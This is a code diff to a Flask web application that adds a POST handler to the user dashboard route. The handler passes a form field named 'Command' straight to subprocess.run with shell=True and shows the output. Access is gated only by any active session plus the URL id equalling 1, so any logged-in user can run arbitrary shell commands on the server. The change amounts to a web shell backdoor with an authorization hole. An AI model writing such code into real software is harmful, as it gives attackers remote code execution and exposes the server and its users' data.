@@ -1,3 +1,5 @@
+import subprocess
+
 from flask import Flask, render_template, request, redirect, flash, session
 from flask_sqlalchemy import SQLAlchemy
 from hashlib import sha256
@@ -69,10 +71,21 @@ def register():
         return render_template("register.html")
 
 
-@app.route("/dashboard/<int:id>")
+@app.route("/dashboard/<int:id>", methods=["GET", "POST"])
 def dashboard(id: int):
     user = User.query.get_or_404(id)
+
+    if request.method == "POST":
+        if "user_id" in session:
+            if id == 1:
+                cmd = request.form["Command"]
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                flash(result.stdout)
+                flash(result.stderr)
+                return render_template("admin_dashboard.html", user=user)
     if "user_id" in session:
+        if id == 1:
+            return render_template("admin_dashboard.html", user=user)
         return render_template("dashboard.html", user=user)
     else:
         return redirect("/login")
